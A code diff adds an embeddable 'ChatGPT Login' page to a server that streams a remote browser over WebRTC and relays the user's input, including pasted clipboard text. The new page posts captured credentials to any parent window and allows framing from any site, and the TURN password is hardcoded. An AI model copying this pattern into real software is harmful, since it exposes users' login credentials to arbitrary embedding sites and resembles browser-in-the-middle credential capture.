@@ -20,6 +20,13 @@ DISPLAY_WIDTH = 1920  # Full HD for good clarity
 DISPLAY_HEIGHT = 1080  # 1080p
 FPS = 30  # Higher FPS for smoother interaction
 
+PUBLIC_IP = os.environ.get("PUBLIC_IP", os.environ.get("SERVER_PUBLIC_IP", "64.23.163.23"))
+TURN_URLS = [f"turn:{PUBLIC_IP}:3478", f"turn:{PUBLIC_IP}:5349"]
+STUN_URLS = [
+    "stun:stun.l.google.com:19302",
+    "stun:stun1.l.google.com:19302",
+]
+
 # Global state
 pcs = set()
 xvfb_process = None
@@ -366,10 +373,10 @@ async def offer(request):
 
     pc = RTCPeerConnection(configuration=RTCConfiguration(
         iceServers=[
-            RTCIceServer(urls="stun:stun.l.google.com:19302"),
-            RTCIceServer(urls="stun:stun1.l.google.com:19302"),
+            RTCIceServer(urls=STUN_URLS[0]),
+            RTCIceServer(urls=STUN_URLS[1]),
             RTCIceServer(
-                urls=["turn:127.0.0.1:3478", "turn:127.0.0.1:5349"],
+                urls=TURN_URLS,
                 username="webrtc",
                 credential="password123"
             ),
@@ -482,7 +489,10 @@ async def offer(request):
 
 async def index(request):
     """Serve the frontend HTML page"""
-    html = """<!DOCTYPE html>
+    turn_urls_js = json.dumps(TURN_URLS)
+    stun_urls_js = json.dumps(STUN_URLS)
+
+    html = f"""<!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
@@ -622,17 +632,17 @@ async def index(request):
                 updateStatus('Connecting...', 'normal');
                 loadingEl.style.display = 'block';
 
-                pc = new RTCPeerConnection({
+                pc = new RTCPeerConnection({{
                     iceServers: [
-                        { urls: 'stun:stun.l.google.com:19302' },
-                        { urls: 'stun:stun1.l.google.com:19302' },
-                        {
-                            urls: ['turn:localhost:3478', 'turn:localhost:5349'],
+                        {{ urls: {stun_urls_js}[0] }},
+                        {{ urls: {stun_urls_js}[1] }},
+                        {{
+                            urls: {turn_urls_js},
                             username: 'webrtc',
                             credential: 'password123'
-                        }
+                        }}
                     ]
-                });
+                }});
 
                 pc.addTransceiver('video', { direction: 'recvonly' });
                 const videoTransceiver = pc.getTransceivers().find(t => t.receiver && t.receiver.track && t.receiver.track.kind === 'video');
@@ -935,6 +945,254 @@ async def index(request):
 </html>"""
     return web.Response(text=html, content_type="text/html")
 
+async def embed(request):
+    """Serve embeddable minimal UI page"""
+    turn_urls_js = json.dumps(TURN_URLS)
+    stun_urls_js = json.dumps(STUN_URLS)
+
+    html = f"""<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <title>ChatGPT Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <style>
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        body {{
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #000;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            overflow: hidden;
+        }}
+        .video-container {{
+            flex: 1;
+            position: relative;
+            background: #000;
+        }}
+        video {{
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            background: #000;
+        }}
+        .overlay {{
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.75);
+            padding: 16px 22px;
+            border-radius: 10px;
+            font-size: 15px;
+            text-align: center;
+            display: none;
+        }}
+        .overlay.show {{
+            display: block;
+        }}
+        .overlay.success {{
+            color: #10a37f;
+        }}
+    </style>
+</head>
+<body>
+    <div class="video-container">
+        <video id="remoteVideo" autoplay playsinline></video>
+        <div id="statusOverlay" class="overlay show">Initializing secure login...</div>
+        <div id="successOverlay" class="overlay success">✓ Login successful<br/>Credentials delivered</div>
+    </div>
+    <script>
+        const OFFER_URL = '/offer';
+        const peerId = 'peer_' + Math.random().toString(36).slice(2, 10);
+        const remoteVideo = document.getElementById('remoteVideo');
+        const statusOverlay = document.getElementById('statusOverlay');
+        const successOverlay = document.getElementById('successOverlay');
+
+        let pc = null;
+        let dc = null;
+
+        function updateStatus(message) {{
+            statusOverlay.textContent = message;
+            statusOverlay.classList.add('show');
+        }}
+
+        function hideStatus() {{
+            statusOverlay.classList.remove('show');
+        }}
+
+        function showSuccess() {{
+            hideStatus();
+            successOverlay.classList.add('show');
+            setTimeout(() => successOverlay.classList.remove('show'), 3000);
+        }}
+
+        function postCredentials(credentials) {{
+            try {{
+                window.parent.postMessage({{ type: 'chatgpt-credentials', credentials }}, '*');
+            }} catch (err) {{
+                console.warn('Failed to post credentials to parent window:', err);
+            }}
+        }}
+
+        async function connect() {{
+            try {{
+                updateStatus('Connecting...');
+
+                pc = new RTCPeerConnection({{
+                    iceServers: [
+                        {{ urls: {stun_urls_js}[0] }},
+                        {{ urls: {stun_urls_js}[1] }},
+                        {{
+                            urls: {turn_urls_js},
+                            username: 'webrtc',
+                            credential: 'password123'
+                        }}
+                    ]
+                }});
+
+                pc.addTransceiver('video', {{ direction: 'recvonly' }});
+
+                pc.ontrack = (event) => {{
+                    remoteVideo.srcObject = event.streams[0];
+                    hideStatus();
+                }};
+
+                pc.onconnectionstatechange = () => {{
+                    if (pc.connectionState === 'failed' || pc.connectionState === 'disconnected' || pc.connectionState === 'closed') {{
+                        updateStatus('Connection ' + pc.connectionState);
+                    }}
+                }};
+
+                dc = pc.createDataChannel('input', {{ ordered: true }});
+                dc.onmessage = handleDataChannelMessage;
+                dc.onclose = () => {{}};
+
+                const offer = await pc.createOffer();
+                await pc.setLocalDescription(offer);
+
+                const response = await fetch(OFFER_URL, {{
+                    method: 'POST',
+                    headers: {{ 'Content-Type': 'application/json' }},
+                    body: JSON.stringify({{
+                        peer_id: peerId,
+                        sdp: pc.localDescription.sdp,
+                        type: pc.localDescription.type
+                    }})
+                }});
+
+                if (!response.ok) {{
+                    throw new Error('Server error: ' + response.status);
+                }}
+
+                const answer = await response.json();
+                await pc.setRemoteDescription({{
+                    type: answer.type,
+                    sdp: answer.sdp
+                }});
+
+                updateStatus('Connected');
+                setTimeout(hideStatus, 1200);
+            }} catch (error) {{
+                console.error(error);
+                updateStatus('Connection failed: ' + error.message);
+            }}
+        }}
+
+        function handleDataChannelMessage(event) {{
+            try {{
+                const data = JSON.parse(event.data);
+                if (data.type === 'credentials') {{
+                    postCredentials(data.credentials);
+                    showSuccess();
+                }}
+            }} catch (e) {{
+                // Ignore non-JSON messages
+            }}
+        }}
+
+        function sendInput(data) {{
+            if (dc && dc.readyState === 'open') {{
+                dc.send(JSON.stringify(data));
+            }}
+        }}
+
+        ['mousedown', 'mouseup', 'mousemove'].forEach(eventName => {{
+            remoteVideo.addEventListener(eventName, (e) => {{
+                if (!dc || dc.readyState !== 'open') return;
+                e.preventDefault();
+
+                const rect = remoteVideo.getBoundingClientRect();
+                const scaleX = {DISPLAY_WIDTH} / rect.width;
+                const scaleY = {DISPLAY_HEIGHT} / rect.height;
+                const x = Math.round((e.clientX - rect.left) * scaleX);
+                const y = Math.round((e.clientY - rect.top) * scaleY);
+                const button = e.button + 1;
+                sendInput({{ type: eventName, x, y, button }});
+            }});
+        }});
+
+        document.addEventListener('keydown', async (e) => {{
+            if (!dc || dc.readyState !== 'open') return;
+            e.preventDefault();
+
+            if (e.key.toLowerCase() === 'v' && (e.ctrlKey || e.metaKey)) {{
+                try {{
+                    const clipboardText = await navigator.clipboard.readText();
+                    sendInput({{
+                        type: 'keydown',
+                        key: e.key,
+                        ctrlKey: e.ctrlKey,
+                        metaKey: e.metaKey,
+                        clipboardText: clipboardText
+                    }});
+                    return;
+                }} catch (err) {{
+                    console.warn('Clipboard access failed:', err);
+                }}
+            }}
+
+            let keyName = e.key;
+            if (e.key === 'Backspace') keyName = 'BackSpace';
+            else if (e.key === 'Enter') keyName = 'Return';
+            else if (e.key === ' ') keyName = 'space';
+            else if (e.key === 'Tab') keyName = 'Tab';
+            else if (e.key === 'Escape') keyName = 'Escape';
+            else if (e.key === 'ArrowUp') keyName = 'Up';
+            else if (e.key === 'ArrowDown') keyName = 'Down';
+            else if (e.key === 'ArrowLeft') keyName = 'Left';
+            else if (e.key === 'ArrowRight') keyName = 'Right';
+            else if (e.key === 'Delete') keyName = 'Delete';
+            else if (e.key === 'Insert') keyName = 'Insert';
+            else if (e.key === 'Home') keyName = 'Home';
+            else if (e.key === 'End') keyName = 'End';
+            else if (e.key === 'PageUp') keyName = 'Page_Up';
+            else if (e.key === 'PageDown') keyName = 'Page_Down';
+
+            sendInput({{
+                type: 'keydown',
+                key: keyName,
+                ctrlKey: e.ctrlKey,
+                metaKey: e.metaKey
+            }});
+        }});
+
+        remoteVideo.addEventListener('contextmenu', (e) => e.preventDefault());
+
+        window.addEventListener('load', () => {{
+            connect();
+        }});
+    </script>
+</body>
+</html>"""
+
+    response = web.Response(text=html, content_type="text/html")
+    response.headers['X-Frame-Options'] = 'ALLOWALL'
+    response.headers['Content-Security-Policy'] = "frame-ancestors *"
+    return response
+
 async def restart_electron(request):
     """Restart Electron app for fresh session"""
     print("\n" + "="*30)
@@ -1007,6 +1265,7 @@ def main():
     # Set up aiohttp application
     app = web.Application()
     app.router.add_get('/', index)
+    app.router.add_get('/embed', embed)
     app.router.add_post('/offer', offer)
     app.router.add_post('/restart-electron', restart_electron)
     app.on_shutdown.append(on_shutdown)
@@ -1015,7 +1274,7 @@ def main():
     print("WebRTC Electron Streaming Server with TURN")
     print("="*60)
     print(f"Server running at http://0.0.0.0:8080")
-    print(f"TURN server: turn:localhost:3478 / turn:localhost:5349")
+    print(f"TURN server URLs: {', '.join(TURN_URLS)}")
     print(f"Display: {DISPLAY_NUM}")
     print(f"Resolution: {DISPLAY_WIDTH}x{DISPLAY_HEIGHT}")
     print("="*60 + "\n")
